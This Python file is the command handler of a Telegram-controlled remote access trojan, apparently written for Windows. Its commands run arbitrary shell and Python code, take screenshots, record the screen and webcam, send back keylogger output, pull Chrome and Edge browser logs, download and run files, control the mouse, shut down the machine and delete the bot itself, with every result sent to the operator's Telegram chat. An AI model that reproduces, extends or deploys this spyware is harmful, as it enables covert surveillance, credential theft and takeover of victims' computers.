import re
import logging
import os
from commands import *
from time import sleep


def send_safe_message(chat_id, message):
    while True:
        try:
            bot.sendMessage(chat_id, message)
            break
        except:
            sleep(1)


def send_safe_document(chat_id, file_path):
    """Безопасная отправка документа с повторными попытками"""
    while True:
        try:
            with open(file_path, 'rb') as f:
                bot.sendDocument(chat_id, f)
            break
        except:
            sleep(1)


def send_file_and_cleanup(chat_id, file_path, response_text=None):
    """Отправляет файл, удаляет его и возвращает текст ответа"""
    send_safe_document(chat_id, file_path)
    os.remove(file_path)
    return response_text


def handle_message(msg):
    chat_id = msg['chat']['id']
    if not checkchat_id(chat_id):
        return

    if 'document' in msg:
        try:
            file_id = msg['document']['file_id']
            file_name = msg['document']['file_name']
            save_path = os.path.join(SCRIPTS_DIR, file_name)
            bot.download_file(file_id, save_path)
            bot.sendMessage(chat_id, f"Файл {file_name} успешно сохранён!")
        except Exception as e:
            logging.error(f"Ошибка скачивания файла: {e}")
            bot.sendMessage(chat_id, f"Ошибка: {e}")
        return

    if 'text' not in msg:
        return

    command = msg['text'].strip()
    response = ''

    try:
        if command == '/start':
            response = get_start_message()

        elif command == '/ping':
            response = ping()

        elif command == '/pc_info':
            response = get_pc_info()

        elif command == '/ip_info':
            info = get_ip_info()
            bot.sendLocation(chat_id, *info['location'])
            response = info['text']

        elif command.startswith('/cmd_exec'):
            result = execute_cmd(command.replace('/cmd_exec', ''))
            temp_path = os.path.join(LOG_DIR, 'cmd_output.txt')
            with open(temp_path, 'w', encoding='utf-8') as f:
                f.write(result)
            send_file_and_cleanup(chat_id, temp_path)
            response = result[:700]

        elif command.startswith('/python_exec'):
            code = command.replace('/python_exec', '').strip()
            if not code:
                response = 'Использование: /python_exec <код>'
            else:
                path, result = python_exec(code)
                if path:
                    send_file_and_cleanup(chat_id, path)
                else:
                    response = result

        elif command == '/capture_pc':
            path, response = capture_pc()
            send_file_and_cleanup(chat_id, path)

        elif command.startswith('/video_pc'):
            parts = command.replace('/video_pc', '').strip()
            seconds = min(int(parts) if parts else 30, 500)
            path, response = record_screen(seconds)
            send_file_and_cleanup(chat_id, path)

        elif command == '/capture_webcam':
            path = capture_webcam()
            if path:
                send_file_and_cleanup(chat_id, path)
            else:
                response = 'Ошибка захвата с камеры'

        elif command.startswith('/msg_box'):
            msg = command.replace('/msg_box', '').strip()
            response = msg_box(msg)

        elif command.startswith('/message_write'):
            match = re.search(r'^/message_write\s+"(.+)"$', command)
            if match:
                response = message_write(match.group(1))
            else:
                response = 'Использование: /message_write "ваш текст"'

        elif command.startswith('/move_mouse_coord'):
            parts = command.replace('/move_mouse_coord', '').strip().split()
            if len(parts) == 2:
                x, y = int(parts[0]), int(parts[1])
                response = move_mouse_coord(x, y)
            else:
                response = 'Использование: /move_mouse_coord <x> <y>'

        elif command.startswith('/move_mouse'):
            parts = command.replace('/move_mouse', '').strip().split()
            if len(parts) == 2:
                direction, offset = parts
                result = move_mouse_direction(direction.lower(), offset)
                response = result if result else '❌ Направление должно быть: левее, правее, выше, ниже.'
            else:
                response = 'Использование: /move_mouse <направление> <пиксели>'

        elif command == '/click_mouse':
            response = click_mouse()

        elif command.startswith('/download'):
            path = command.replace('/download', '').strip()
            file_path = download_file(path)
            if file_path:
                send_safe_document(chat_id, file_path)
            else:
                response = f'Файл не найден: {path}'

        elif command.startswith('/run'):
            path = command.replace('/run', '').strip()
            response = run_file(path)

        elif command.startswith('/wallpaper'):
            path = command.replace('/wallpaper', '').strip()
            response = set_wallpaper(path)

        elif command.startswith('/ls'):
            path = command.replace('/ls', '').strip()
            response = list_directory(path)

        elif command == '/shutdown':
            response = shutdown()

        elif command == '/reboot':
            response = reboot()

        elif command == '/keylogs':
            send_safe_document(chat_id, KEYLOG_FILE)
            get_keylog_file()

        elif command == '/user_log':
            send_safe_document(chat_id, LOG_FILE)
            get_user_log_file()

        elif command == '/chrome_log':
            response = get_browser_log(browser='chrome')

        elif command == '/edge_log':
            response = get_browser_log(browser='edge')

        elif command == '/self_destruct':
            response = confirm_self_destruct()

        elif command == '/destroy':
            self_destruct()

        elif command.startswith('/create_more_folders'):
            parts = command.replace('/create_more_folders', '').strip().split()
            if len(parts) >= 3:
                response = create_desktop_folders(int(parts[0]), parts[1], parts[2])

    except Exception as e:
        response = f'⚠️ Ошибка: {e}'

    if response:
        send_safe_message(chat_id, response)


